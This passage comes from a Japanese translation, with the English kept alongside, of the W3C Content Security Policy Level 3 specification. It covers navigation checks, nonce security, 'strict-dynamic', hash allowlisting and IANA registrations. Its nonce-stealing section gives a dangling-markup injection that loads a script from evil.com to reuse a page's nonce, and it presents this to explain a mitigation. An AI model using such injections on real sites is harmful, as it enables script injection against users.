</p>

<pre class="ABNF">
`directive-name$p  = "navigation-to"
`directive-value$p = `serialized-source-list$p
</pre>

<p class="issue">
`ancestor-source-list$p を利用するべきか？（基本的に、~pathではなく，生成元？）。
漏洩に関しては、~navi~targetを阻止することが，他の種別の要請を阻止することより悪くなることは，ないように見える。
~redirectの挙動においては、これは，生成元~検査に委ねられる
— 悪意的な主体の存在下で…。
◎
Should we use ancestor-source-list (basically, origins as opposed to paths?) It doesn’t appear that blocking navigation targets is any worse than blocking any other request type with regard to leakage. Given the redirect behavior, this devolves to an origin check in the presence of a malicious party anyway...
</p>


				<section id="navigation-to-pre-navigate">
<h5 title="navigation-to Pre-Navigation Check ">6.3.3.1.  `navigation-to^dir による~navi前~検査</h5>


<p>
次の~algoが、この指令の`~navi前~検査$Aを与える：
それは、所与の
( 
`要請$ %要請,
文字列 %種別 ~IN { `form-submission^l, `other^l },
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
)
に対し，［
当の~naviが `navigation-to^dir 指令に違反するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (request), a string (type, "form-submission or "other") and two browsing contexts (source and target), this algorithm returns "Blocked" if the navigation violates the navigation-to directive’s constraints, and "Allowed" otherwise. This constitutes the navigation-to' directive’s pre-navigation check:
</p>

<ol class="algorithm">

	<li>
~Assert：
%~source, %~target は、この~algoには利用されない
— `navigation-to^dir が懸念するのは、外向けの要請の詳細に限られるので。
◎
Assert: source and target are unused in this algorithm, as navigation-to is concerned only with details of the outgoing request.
</li>
	<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>

</ol>

				</section>
			</section>
		</section>
	</section>
	<section id="security-considerations">
<h2 title="Security and Privacy Considerations">7. 保安と~privacy上の考慮点</h2>

		<section id="security-nonces">
<h3 title="Nonce Reuse">7.1. ~nonceの再利用-</h3>

<p>
~nonceは、それが送達された指令~内に在する他の制約を，上書きする。
ゆえに、推測不能であり続けることが不可欠になる
— さもなければ、資源の施策を迂回することは，自明になるので。
◎
Nonces override the other restrictions present in the directive in which they’re delivered. It is critical, then, that they remain unguessable, as bypassing a resource’s policy is otherwise trivial.
</p>

<p>
`施策$の一部として
`nonce-source$p 式を送達する~serverは、施策の各~伝送-ごとに一意な値を生成し~MUST。
生成される値は、攻撃者による予測-が困難になる~SHOULDであり，［
（符号化する前の時点で） 128 ~bit以上
］, かつ［
暗号的に保安的な乱数生成器を介して生成される
］~SHOULDである。
◎
If a server delivers a nonce-source expression as part of a policy, the server MUST generate a unique value each time it transmits a policy. The generated value SHOULD be at least 128 bits long (before encoding), and SHOULD be generated via a cryptographically secure random number generator in order to ensure that the value is difficult for an attacker to predict.
</p>

<p class="note">注記：
<span class="trans-note">【
`script-src$dir／`style-src$dir
指令において
】</span>
~nonceを利用して~inlineの［
~script／~style
］を~whitelist化するのは、~nonceを利用しないでそうするときより保安的でない
— ~nonceは、それが在する指令~内の制約を上書きするので。
~nonceへの~accessを得られる攻撃者は、~~任意の~scriptを~~任意に実行できる。
とは言え、古い~code上に~CSP層を重ねるとき，~nonceの利用は `unsafe-inline$pl を大きく改善する。
作者には、 `unsafe-inline$pl を検討するときは，代わりに~nonce（または~hash）を検討することが奨励される。
◎
Note: Using a nonce to whitelist inline script or style is less secure than not using a nonce, as nonces override the restrictions in the directive in which they are present. An attacker who can gain access to the nonce can execute whatever script they like, whenever they like. That said, nonces provide a substantial improvement over 'unsafe-inline' when layering a content security policy on top of old code. When considering 'unsafe-inline', authors are encouraged to consider nonces (or hashes) instead.
</p>

		</section>
		<section id="security-nonce-stealing">
<h3 title="Nonce Stealing">7.2. ~nonceの盗用</h3>

<p>
`FILEDESCRIPTOR-2015$r などで論じられている，~dangling-markup攻撃（ dangling markup attack ）は、~pageの正当な~nonceを注入-用に転用するためにも利用され得る。
例えば、所与の `script$e 要素の前に注入~地点があるとする：
◎
Dangling markup attacks such as those discussed in [FILEDESCRIPTOR-2015] can be used to repurpose a page’s legitimate nonces for injections. For example, given an injection point before a script element:
</p>


<pre class="html-code">
&lt;p&gt;Hello, %注入~地点&lt;/p&gt;
&lt;script nonce=abc src=/good.js&gt;&lt;/script&gt;
</pre>
<!-- 
INJECTION POINT
-->
<p>
攻撃者が文字列 `&lt;script src='https://evil.com/evil.js' ^l を注入した場合、~browserは次を受信することになる：
◎
If an attacker injects the string "&lt;script src='https://evil.com/evil.js' ", then the browser will receive the following:
</p>

<pre class="html-code">
&lt;p&gt;Hello, <mark>&lt;script src='https://evil.com/evil.js' </mark>&lt;/p&gt;
&lt;script nonce=abc <mark>src=/good.js</mark>&gt;&lt;/script&gt;
</pre>


<p>
その~codeを構文解析した結果の `script$e 要素には、次に挙げる名前の属性：
<span class="block">
`src^l , `&lt;/p&gt;^l , `&lt;script^l , `nonce^l, もう一つの `src^l
</span>
が伴われることになる。
最初の `src^a 属性
— 悪意的な~sourceを指している —
のおかげで、元からあった 2 番目の `src^a 属性は，構文解析器により重複として破棄される。
◎
It will then parse that code, ending up with a script element with a src attribute pointing to a malicious payload, an attribute named &lt;/p&gt;, an attribute named "&lt;script", a nonce attribute, and a second src attribute which is helpfully discarded as duplicate by the parser.
</p>

<p>
`要素は~nonceableか？$A
~algoは、 `script$e 要素の属性を走査して，その名前や値から文字列
`&lt;script^l ／ `&lt;style^l
を探し出すことで、この特定の攻撃を軽減しようと試みるものである。
◎
The §6.6.2.1 Is element nonceable? algorithm attempts to mitigate this specific attack by walking through script element attributes, looking for the string "&lt;script" or "&lt;style" in their names or values.
</p>

		</section>
		<section id="security-css-parsing">
<h3 title="CSS Parsing">7.3. ~CSS構文解析</h3>

<p>
`style-src$dir 指令は、［
被保護~資源が，~styleをどの所在から読込めるか
］を制約する。
しかしながら，~UAの~CSS構文解析~algoが緩い場合、攻撃者は，信用できない生成元に~hostされている悪意的な “~stylesheet” を受容するように ~UAを騙せるかもしれない。
◎
The style-src directive restricts the locations from which the protected resource can load styles. However, if the user agent uses a lax CSS parsing algorithm, an attacker might be able to trick the user agent into accepting malicious "stylesheets" hosted by an otherwise trustworthy origin.
</p>

<p>
これらの攻撃は、
2009 年に Chris Evans により示された ~CSS非同一生成元~data漏洩~攻撃 `CSS-ABUSE$r
に類似するものである。
いずれの攻撃に対しても、~UAは，同じ仕組み
— ~MIME型が不適正な~stylesheetに対しては，より厳格な~CSS構文解析~規則を適用する —
で防御する~SHOULDである：
◎
These attacks are similar to the CSS cross-origin data leakage attack described by Chris Evans in 2009 [CSS-ABUSE]. User agents SHOULD defend against both attacks using the same mechanism: stricter CSS parsing rules for style sheets with improper MIME types.
</p>

		</section>
		<section id="security-violation-reports">
<h3 title="Violation Reports">7.4. 違反~報告</h3>

<p>
この文書における違反~報告処理の仕組みは、［
悪意的な~web~siteが，違反~報告を利用して，他の~serverの挙動を探査する~risk
］を軽減するように設計されている。
例えば，画像の~sourceとして
`https://example.com^s
を~whitelist化している，悪意的な~web~siteを考える。
この~siteが、【 example.com の~log-in用~pageの~URLである】
`https://example.com/login^s
を画像として読込もうと試みた場合、
`example.com^s の~serverが，ある identity provider†（例えば
`identityprovider.example.net^s
とする）へ~redirectしたとするとき、~CSPにより，その要請は阻止されることになる。
仮に、阻止された~URLを，違反~報告に全部的に包含することにした場合、違反~報告に，~redirect先の~URL内に［
~session識別子や purported identities††などの敏感な情報
］が包含されていれば，それも包含することになる。
この理由から、~UAは，~redirect~targetではなく 元の要請の~URLを違反~報告に含むようにしている。
◎
The violation reporting mechanism in this document has been designed to mitigate the risk that a malicious web site could use violation reports to probe the behavior of other servers. For example, consider a malicious web site that whitelists https://example.com as a source of images. If the malicious site attempts to load https://example.com/login as an image, and the example.com server redirects to an identity provider (e.g. identityprovider.example.net), CSP will block the request. If violation reports contained the full blocked URL, the violation report might contain sensitive information contained in the redirected URL, such as session identifiers or purported identities. For this reason, the user agent includes only the URL of the original request, not the redirect target.
</p>


<p class="trans-note">【†
“identity provider”
— <abbr>IdP</abbr> とも略称される，個人認証サービスを専門に提供するプロバイダを指すものと見られる。
】【††
“purported identities（ある特定目的の識別情報）”
— 現実の個人の識別は含意しないような，（当の~site専用の）異なる個人を別人として識別する類の情報と見られる。
】</p>


		</section>
	</section>
	<section id="authoring-considerations">
<h2 title="Authoring Considerations">8. 著作上の考慮点</h2>

		<section id="multiple-policies">
<h3 title="The effect of multiple policies">8.1. 複数の施策による効果</h3>

~INFORMATIVE

<p>
上の節【どの節？】では、施策が複数~在するときは、それぞれが，その型に則って［
施行-／報告-
］され~MUSTと記されている。
実施において，これがどう働くものとされるべきか、明確化する例を示す。
何らかの理由で、ある~siteから【の資源に伴って】次の HTTP ~headerが送達されてきたとする：
◎
The above sections note that when multiple policies are present, each must be enforced or reported, according to its type. An example will help clarify how that ought to work in practice. The behavior of an XMLHttpRequest might seem unclear given a site that, for whatever reason, delivered the following HTTP headers:
</p>

<div class="example">

<pre class="http-code">
`Content-Security-Policy$h:
    `default-src$dir `self$pl http://example.com http://example.net;
    `connect-src$dir `none$pl;

`Content-Security-Policy$h:
    `connect-src$dir http://example.com/;
    `script-src$dir http://example.com/
</pre>
</div>

<p>
このとき、【この資源における】
`XMLHttpRequest$I
<!-- 
の挙動は，はっきりしないように見えるかもしれない
 -->
による
`example.com^s
への接続は許容されるか？
— 答えは、許容されない，である。
両~施策の施行は、［
起こりうる接続が，両者ともに無傷で合格しなければならない
］ことを意味する。
二番目の施策がこの接続を許容するとしても，最初の施策が
<samp>`connect-src$dir `none$pl</samp>
を包含するので、その施行により接続は阻止される。
施行する施策の~listに，施策を追加することによる影響0は、被保護~資源の能力に制約を追加しこそすれ，それを~~緩めることはない。
◎
Is a connection to example.com allowed or not? The short answer is that the connection is not allowed. Enforcing both policies means that a potential connection would have to pass through both unscathed. Even though the second policy would allow this connection, the first policy contains connect-src 'none', so its enforcement blocks the connection. The impact is that adding additional policies to the list of policies to enforce can only further restrict the capabilities of the protected resource.
</p>

<p>
更に~~説明するため、この~page上の~script~tagを考える。
最初の施策は，~scriptを `default-src$dir 指令による
{ `self$pl, `http://example.com^s, `http://example.net^s }
の枠内に絞る一方、二番目の施策は，
`http://example.com/^s
からの~scriptのみを許容する。
~scriptが読込まれるのは，両~施策の判定基準を満たす場合に限られるので、合致し得る生成元は
`http://example.com^s
のみになる。
◎
To demonstrate that further, consider a script tag on this page. The first policy would lock scripts down to 'self', http://example.com and http://example.net via the default-src directive. The second, however, would only allow script from http://example.com/. Script will only load if it meets both policy’s criteria: in this case, the only origin that can match is http://example.com, as both policies allow it.
</p>

		</section>
		<section id="strict-dynamic-usage">
<h3 title="Usage of &quot;'strict-dynamic'&quot;">8.2. `strict-dynamic^pl の用法</h3>

<p>
~whitelistを~~正しく保つことは、とりわけ CDN の様な まとまりのない生成元では，大変になる。
<a href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22#107-bytes">solutions to Cure53’s H5SC Minichallenge 3: "Sh*t, it’s CSP!"</a>
`H5SC3$r
は，~whitelistが可能化し得る迂回の好例であり、~CSPが，大規模な~whitelistを介して これらの迂回を軽減する能力を有するとしても、壊れ易く, 扱い難く, 実装する／保守するのが困難になりがちである。
◎
Whitelists are tough to get right, especially on sprawling origins like CDNs. The solutions to Cure53’s H5SC Minichallenge 3: "Sh*t, it’s CSP!" [H5SC3] are good examples of the kinds of bypasses which whitelists can enable, and though CSP is capable of mitigating these bypasses via extensive whitelists, those end up being brittle, awkward, and difficult to implement and maintain.
</p>

<p>
`strict-dynamic$pl ~source式は、既存の~appが，自身が直接的に読込む~scriptについては自信があるが，適度に保安的な~whitelistを提供する能については自信がない場合に、~CSPをより単純に配備できるようにすることを目指している。
◎
The "'strict-dynamic'" source expression aims to make Content Security Policy simpler to deploy for existing applications who have a high degree of confidence in the scripts they load directly, but low confidence in their ability to provide a reasonably secure whitelist.
</p>

<p>
`script-src$dir ／ `default-src$dir
指令~内に在する場合、 2 つの主な効果がある：
◎
If present in a script-src or default-src directive, it has two main effects:
</p>

<ul>
	<li>
<p>(A)：
式［
`host-source$p, `scheme-source$p
］, および `keyword-source$p［
`unsafe-inline$pl, `self$pl
］は、~scriptの読込み時には無視される。
◎
host-source and scheme-source expressions, as well as the "'unsafe-inline'" and "'self' keyword-sources will be ignored when loading script.
</p>

<p>
式［
`hash-source$p, `nonce-source$p
］は、尊守されることになる。
◎
hash-source and nonce-source expressions will be honored.
</p>
	</li>

	<li>(B)：
`構文解析-時に挿入され$たものではない `script$e 要素により誘発される~script要請は、許容される。
◎
Script requests which are triggered by non-"parser-inserted" script elements are allowed.
</li>

</ul>

<div class="p">
<p>
(A) は、後方互換な仕方で，~UAによる~~推定（ sniffing ）を要することなく
`strict-dynamic$pl を配備できるようにする。
例えば施策
<samp>`unsafe-inline$pl https: 'nonce-abcdefg' `strict-dynamic$pl</samp>
は、~browserが~supportする~CSPの~versionに応じて，次であるかの様に動作することになる：
</p>

<ul ><li>CSP1 ならば
<samp>`unsafe-inline^pl https:</samp>
</li><li>CSP2 ならば
<samp>https: 'nonce-abcdefg'</samp>
</li><li>CSP3 ならば
<samp>'nonce-abcdefg' `strict-dynamic^pl</samp>
</li></ul>

◎
The first change allows you to deploy "'strict-dynamic' in a backwards compatible way, without requiring user-agent sniffing: the policy 'unsafe-inline' https: 'nonce-abcdefg' 'strict-dynamic' will act like 'unsafe-inline' https: in browsers that support CSP1, https: 'nonce-abcdefg' in browsers that support CSP2, and 'nonce-abcdefg' 'strict-dynamic' in browsers that support CSP3.
</div>

<p>
(B) は、［
~nonce／~hash
］を介して~pageへの~accessが与えられた~scriptが、~pageの施策に明示的に追加することなく，他との依存関係を持ち込めるようにする。
◎
The second allows scripts which are given access to the page via nonces or hashes to bring in their dependencies without adding them explicitly to the page’s policy.
</p>

<div class="example">
<p>
MegaCorp 社は、次の施策を配備していて：
◎
Suppose MegaCorp, Inc. deploys the following policy:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    `script-src$dir 'nonce-abcdefg' `strict-dynamic$pl
</pre>

<p>
作動中の施策を伴う，次の~HTMLを~serveしているとする：
◎
And serves the following HTML with that policy active:
</p>

<pre class="html-code">
...
&lt;script
    src="https://cdn.example.com/script.js"
    nonce="abcdefg"
&gt;&lt;/script&gt;
...
</pre>

<p>
これは
`https://cdn.example.com/script.js^s
に対する要請を生成することになり、それは
`nonce$a 属性に合致するので阻止されないことになる。
◎
This will generate a request for https://cdn.example.com/script.js, which will not be blocked because of the matching nonce attribute.
</p>

<p>
`script.js^s が次の~codeを包含するならば：
◎
If script.js contains the following code:
</p>

<pre>
var %s = document.createElement('script');
%s.src = 'https://othercdn.not-example.net/dependency.js';
document.head.appendChild('s');

document.write('&lt;scr' + 'ipt src='/sadness.js'&gt;&lt;/scr' + 'ipt&gt;');
</pre>

<p>
`dependency.js^s
は読込まれることになる
— `createElement()^c により作成される `script$e 要素は、`構文解析-時に挿入され$るものではないので。
◎
dependency.js will load, as the script element created by createElement() is not parser-inserted.
</p>

<p>
一方で、 `sadness.js^c は<em>読込まれない</em>
— `document.write()^c は，`構文解析-時に挿入され$る `script$e 要素を生産するので。
◎
sadness.js will not load, however, as document.write() produces script elements which are parser-inserted.
</p>

</div>

		</section>
		<section id="unsafe-hashed-attributes-usage" class="wip">
<h3 title="Usage of &quot;'unsafe-hashed-attributes'&quot;">8.3. `unsafe-hashed-attributes^pl の用法</h3>

~INFORMATIVE

<p class="issue">
まだ策定段階にある。
<a href="https://github.com/w3c/webappsec-csp/issues/13">&lt;https://github.com/w3c/webappsec-csp/issues/13&gt;</a>
◎
Work in progress. &lt;https://github.com/w3c/webappsec-csp/issues/13&gt;
</p>

<p>
［
旧来の~website ／ 旧来の依存関係を伴う~website
］では、~event~handlerをまるごと外部化するのが困難なこともある。
これらの~siteは、その種の~handlerを `unsafe-inline^pl で~whitelist化して可能化することもできるが、それは，多数の~riskを抱える諸刃の剣である（また、~nonceや~hashと共には利用できない）。
◎
Legacy websites and websites with legacy dependencies might find it difficult to entirely externalize event handlers. These sites could enable such handlers by whitelisting 'unsafe-inline', but that’s a big hammer with a lot of associated risk (and cannot be used in conjunction with nonces or hashes).
</p>

<p>
~source式 `unsafe-hashed-attributes$pl は、そのような状況~下で，［
~hashを介して特定の~handlerを~whitelist化できる
］ようにすることで、開発者が，~CSPをより単純かつ安全に配備できるようにすることを目指している。
◎
The "'unsafe-hashed-attributes'" source expression aims to make CSP deployment simpler and safer in these situations by allowing developers to whitelist specific handlers via hashes.
</p>

<div class="example">
<p>
MegaCorp 社は、次の~HTMLを適度な~scheduleで取り去れないので：
◎
MegaCorp, Inc. can’t quite get rid of the following HTML on anything resembling a reasonable schedule:
</p>


<pre class="html-code">
&lt;button id="action" onclick="doSubmit()"&gt;
</pre>

<p>
`unsafe-inline^pl で~whitelist化するのでなく，［
~hash~source式と `unsafe-hashed-attributes^pl
］を利用することに決めた：
◎
Rather than whitelisting "'unsafe-inline'", they decide to use "'unsafe-hashed-attributes'" along with a hash source expression, as follows:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    script-src `unsafe-hashed-attributes$pl
    'sha256-jzgBGA4UWFFmpOBq0JpdsySukE1FrEN5bUpoK8Z29fY='
</pre>

</div>


		</section>
		<section id="external-hash" class="wip">
<h3 title="Whitelisting external JavaScript with hashes ">8.4. 外部~JSに対する~hashによる~whitelist化</h3>

~INFORMATIVE

<p class="issue">
まだ策定段階にある。
<a href="https://github.com/w3c/webappsec-csp/issues/78">&lt;https://github.com/w3c/webappsec-csp/issues/78&gt;</a>
◎
Work in progress. &lt;https://github.com/w3c/webappsec-csp/issues/78&gt;
</p>

<p>
`CSP2$r では、~hash`~source式$は，~inlineの~scriptに限って~whitelist化できていたが、今や Subresource Integrity `SRI$r が広範に配備されたので，外部化された~JSも可能化するように視野を拡げられる。
◎
In [CSP2], hash source expressions could only whitelist inlined script, but now that Subresource Integrity is widely deployed, we can expand the scope to enable externalized JavaScript as well.
</p>

<p>
ある `script$e に対し，複数の完全性~metadataからなる集合が指定された場合、［
要請が施策の `hash-source$p たちに合致する
］ための必要十分条件は，［
`script$e の完全性~metadata内の <em>各</em> ~itemが当の施策に合致する
］ときになる。
◎
If multiple sets of integrity metadata are specified for a script, the request will match a policy’s hash-sources if and only if each item in a script's integrity metadata matches the policy.
</p>

<div class="example">
<p >
MegaCorp 社は，内容が期待に合致することを確保するため、~page上の 2 個の特定の~scriptを~whitelist化したいとする
— 次の施策を設定したとするとき：
◎
MegaCorp, Inc. wishes to whitelist two specific scripts on a page in a way that ensures that the content matches their expectations. They do so by setting the following policy:
</p>


<pre class="http-code">
`Content-Security-Policy$h:
    script-src 'sha256-abc123' 'sha512-321cba'
</pre>

<p>
この施策が在する下では、次の各 `script$e 要素は，~whitelist化されることになる
— いずれも，施策に合致する完全性~metadataのみを包含するので：
◎
In the presence of that policy, the following script elements would be whitelisted because they contain only integrity metadata that matches the policy:
</p>

<pre class="html-code">
&lt;script integrity="sha256-abc123" ...&gt;&lt;/script&gt;
&lt;script integrity="sha512-321cba" ...&gt;&lt;/script&gt;
&lt;script integrity="sha256-abc123 sha512-321cba" ...&gt;&lt;/script&gt;
</pre>

<p>
一方で，次の各 `script$e 要素は，施策に合致しない~metadataを包含するので、いずれも（他の~metadataは合致していても）~whitelist化されない：
◎
While the following script elements would not be whitelisted because they contain metadata that does not match the policy (even though other metadata does match):
</p>

<pre class="html-code">
&lt;script integrity="<mark>sha384-xyz789</mark>" ...&gt;&lt;/script&gt;
&lt;script integrity="<mark>sha384-xyz789</mark> sha512-321cba" ...&gt;&lt;/script&gt;
&lt;script integrity="sha256-abc123 <mark>sha384-xyz789</mark> sha512-321cba" ...&gt;&lt;/script&gt;
</pre>

</div>

		</section>
	</section>
	<section id="implementation-considerations">
<h2 title="Implementation Considerations">9. 実装にあたっての考慮点</h2>



		<section id="extensions">
<h3 title="Vendor-specific Extensions and Addons">9.1. ~vendor特有の拡張／~addon</h3>

<p>
資源~上に施行される`施策$は、［
~addon, 拡張, ~bookmarklet
］などの，~UA特色機能の運用には、干渉する~SHOULDでない。
`HTML-DESIGN$r にて信奉されているように、この種の特色機能は，一般に~page作者より利用者に優先権を与えるものなので。
◎
Policy enforced on a resource SHOULD NOT interfere with the operation of user-agent features like addons, extensions, or bookmarklets. These kinds of features generally advance the user’s priority over page authors, as espoused in [HTML-DESIGN].
</p>

<p>
更には、この種の特色機能に~CSPを適用すると，その違反~報告において相当量の~noise~~源になり、結果として，~web開発者にとっての価値は損われることになる。
◎
Moreover, applying CSP to these kinds of features produces a substantial amount of noise in violation reports, significantly reducing their value to developers.
</p>

<p>
例えば Chromeでは， `chrome-extension^sc ~schemeを~CSP検査から除外しており、~pageの施策に関わらず，拡張により駆動される注入は許容するような 何らかの仕事を行っている。
◎
Chrome, for example, excludes the chrome-extension: scheme from CSP checks, and does some work to ensure that extension-driven injections are allowed, regardless of a page’s policy.
</p>

		</section>
	</section>
	<section id="iana-considerations">
<h2 title="IANA Considerations">10. IANA 考慮点</h2>

		<section id="iana-registry">
<h3 title="Directive Registry">10.1. 指令の登記簿</h3>

<p>
Content Security Policy Directive
（~CSP 指令）登記簿は、次の登録と参照により更新されるべきである
`RFC7762$r
【参照先は指令のリンク先と同じなので省略する】
：
◎
The Content Security Policy Directive registry should be updated with the following directives and references [RFC7762]:
</p>

<div >
<ul ><li>`base-uri$dir
</li><li>`child-src$dir
</li><li>`connect-src$dir
</li><li>`default-src$dir
</li><li>`font-src$dir
</li><li>`form-action$dir
</li><li>`frame-ancestors$dir
</li><li>`frame-src$dir
</li><li>`img-src$dir
</li><li>`manifest-src$dir
</li><li>`media-src$dir
</li><li>`object-src$dir
</li><li>`plugin-types$dir
</li><li>`report-uri$dir
</li><li>`report-to$dir
</li><li>`sandbox$dir
</li><li>`script-src$dir
</li><li>`style-src$dir
</li><li>`worker-src$dir
</li></ul>

◎
base-uri
• This document (see §6.2.1 base-uri)
child-src
• This document (see §6.1.1 child-src)
connect-src
• This document (see §6.1.2 connect-src)
default-src
• This document (see §6.1.3 default-src)
font-src
• This document (see §6.1.4 font-src)
form-action
• This document (see §6.3.1 form-action)
frame-ancestors
• This document (see §6.3.2 frame-ancestors)
frame-src
• This document (see §6.1.5 frame-src)
img-src
• This document (see §6.1.6 img-src)
manifest-src
• This document (see §6.1.7 manifest-src)
media-src
• This document (see §6.1.8 media-src)
object-src
• This document (see §6.1.9 object-src)
plugin-types
• This document (see §6.2.2 plugin-types)
report-uri
• This document (see §6.4.1 report-uri)
report-to
• This document (see §6.4.2 report-to)
sandbox
• This document (see §6.2.3 sandbox)
script-src
• This document (see §6.1.10 script-src)
style-src
• This document (see §6.1.11 style-src)
worker-src
• This document (see §6.1.12 worker-src)
</div>



		</section>
		<section id="iana-headers">
<h3 title="Headers">10.2. ~header登録</h3>

<p>
恒久的~message~header登記簿は、次の登録により更新されるべきである：
`RFC3864$r
◎
The permanent message header field registry should be updated with the following registrations: [RFC3864]
</p>


<div>
<table><tbody><tr><th>~header名
</th><td>
<span id="iana-csp">`Content-Security-Policy$h</span>,<br>
<span id="iana-cspro">`Content-Security-Policy-Report-Only$h</span>
</td></tr><tr><th>適用し得る~protocol
</th><td>http

</td></tr><tr><th>位置付け
</th><td>standard

</td></tr><tr><th>~~作成／~~変更 ~~管理者
</th><td>W3C

</td></tr><tr><th>仕様~文書
</th><td>この仕様

</td></tr></tbody></table>

◎
Content-Security-Policy
◎
Header field name
• Content-Security-Policy 
Applicable protocol
• http 
Status
• standard 
Author/Change controller
• W3C 
Specification document
• This specification (See §3.1 The Content-Security-Policy HTTP Response Header Field) 

◎
Content-Security-Policy-Report-Only
◎
Header field name
• Content-Security-Policy-Report-Only 
Applicable protocol
• http 
Status
• standard 
Author/Change controller
• W3C 
Specification document
• This specification (See §3.2 The Content-Security-Policy-Report-Only HTTP Response Header Field)
</div>



		</section>
	</section>
	<section id="acknowledgements">
<h2 title="Acknowledgements">11. 謝辞</h2>

<p>
~~協力された多数の方々に。
具体的には：
◎
Lots of people are awesome. For instance:
</p>

<ul>
	<li>
Mario and all of Cure53.
</li>
	<li>
Artur Janc, Michele Spagnuolo, Lukas Weichselbaum, Jochen Eisinger, and the
rest of Google’s CSP Cabal.
</li>
</ul>

	</section>

	<section id="conformance">
<h2 title="Conformance">適合性</h2>
<h3 id="conformant-algorithms" title="Conformant Algorithms">適合的~algo</h3>
<h3 id="conventions" title="Document conventions">文書における表記規約</h3>


<p class="trans-note">【
これらの節の内容は
<a href="w3c-common-ja.html#conformance" >W3C 日本語訳 共通ページ</a>
に委譲
】</p>
	</section>

</main></div><!-- MAIN/MAIN0 -->

	<section id="index">
<h2 title="Index">索引</h2>

		<section id="index-defined-here">
<h3 title="Terms defined by this specification">この仕様により定義される用語</h3>
<p class="trans-note">【
この節の内容は省略（ウィンドウ下端の索引機能を利用されたし）。
】</p>

		</section>
		<section id="index-defined-elsewhere">
<h3 title="Terms defined by reference">他の仕様で定義される用語</h3>
<p class="trans-note">【
この節の内容は省略。
】</p>

		</section>
	</section>
	<section id="references">
<h2 title="References">参照文献</h2>

		<section id="normative">
<h3 title="Normative References">文献（規範）</h3>


<dl>

	<dt>[CSS-CASCADE-4]</dt>
	<dd>Elika Etemad; Tab Atkins Jr.. CSS Cascading and Inheritance Level 4. 14 January 2016. CR.</dd>
	<dd>http://dev.w3.org/csswg/css-cascade/</dd>

	<dt>[CSSOM]</dt>
	<dd>Simon Pieters; Glenn Adams. CSS Object Model (CSSOM). 17 March 2016. WD.</dd>
	<dd>https://drafts.csswg.org/cssom/</dd>

	<dt>[ECMA262]</dt>
	<dd>Brian Terlson; Allen Wirfs-Brock. ECMAScript® Language Specification.</dd>
	<dd>https://tc39.github.io/ecma262/</dd>

	<dt>[FETCH]</dt>
	<dd>Anne van Kesteren. Fetch Standard. Living Standard.</dd>
	<dd>https://fetch.spec.whatwg.org/</dd>

	<dt>[HTML]</dt>
	<dd>Ian Hickson. HTML Standard. Living Standard.</dd>
	<dd>https://html.spec.whatwg.org/multipage/</dd>

	<dt>[HTML52]</dt>
	<dd>Steve Faulkner; et al. HTML5.2. 18 August 2016. WD.</dd>
	<dd>https://w3c.github.io/html/</dd>

	<dt>[OOB-REPORTING]</dt>
	<dd>Ilya Gregorik; Mike West. Out-of-band Reporting.</dd>
	<dd>https://mikewest.github.io/error-reporting/</dd>

	<dt>[RFC2045]</dt>
	<dd>N. Freed; N. Borenstein. Multipurpose Internet Mail Extensions (MIME) Part One: Format of Internet Message Bodies. November 1996. Draft Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc2045</dd>

<!-- 
	<dt>[RFC2119]</dt>
 -->

	<dt>[RFC3492]</dt>
	<dd>A. Costello. Punycode: A Bootstring encoding of Unicode for Internationalized Domain Names in Applications (IDNA). March 2003. Proposed Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc3492</dd>

	<dt>[RFC3864]</dt>
	<dd>G. Klyne; M. Nottingham; J. Mogul. Registration Procedures for Message Header Fields. September 2004. Best Current Practice.</dd>
	<dd>https://tools.ietf.org/html/rfc3864</dd>

	<dt>[RFC3986]</dt>
	<dd>T. Berners-Lee; R. Fielding; L. Masinter. Uniform Resource Identifier (URI): Generic Syntax. January 2005. Internet Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc3986</dd>

	<dt>[RFC4648]</dt>
	<dd>S. Josefsson. The Base16, Base32, and Base64 Data Encodings. October 2006. Proposed Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc4648</dd>

	<dt>[RFC5234]</dt>
	<dd>D. Crocker, Ed.; P. Overell. Augmented BNF for Syntax Specifications: ABNF. January 2008. Internet Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc5234</dd>

	<dt>[RFC5988]</dt>
	<dd>M. Nottingham. Web Linking. October 2010. Proposed Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc5988</dd>

	<dt>[RFC7230]</dt>
	<dd>R. Fielding, Ed.; J. Reschke, Ed.. Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing. June 2014. Proposed Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc7230</dd>

	<dt>[RFC7231]</dt>
	<dd>R. Fielding, Ed.; J. Reschke, Ed.. Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content. June 2014. Proposed Standard.</dd>
	<dd>https://tools.ietf.org/html/rfc7231</dd>

	<dt>[RFC7762]</dt>
	<dd>M. West. Initial Assignment for the Content Security Policy Directives Registry. January 2016. Informational.</dd>
	<dd>https://tools.ietf.org/html/rfc7762</dd>

	<dt>[SERVICE-WORKERS]</dt>
	<dd>Alex Russell; Jungkee Song; Jake Archibald. Service Workers. 25 June 2015. WD.</dd>
	<dd>https://slightlyoff.github.io/ServiceWorker/spec/service_worker/</dd>

	<dt>[SHA2]</dt>
	<dd>FIPS PUB 180-4, Secure Hash Standard.</dd>
	<dd>http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf</dd>

	<dt>[SRI]</dt>
	<dd>Devdatta Akhawe; et al. Subresource Integrity. 23 June 2016. REC.</dd>
	<dd>https://w3c.github.io/webappsec-subresource-integrity/</dd>

	<dt>[WHATWG-DOM]</dt>
	<dd>Anne van Kesteren. DOM Standard. Living Standard.</dd>
	<dd>https://dom.spec.whatwg.org/</dd>

	<dt>[WHATWG-URL]</dt>
	<dd>Anne van Kesteren. URL Standard. Living Standard.</dd>
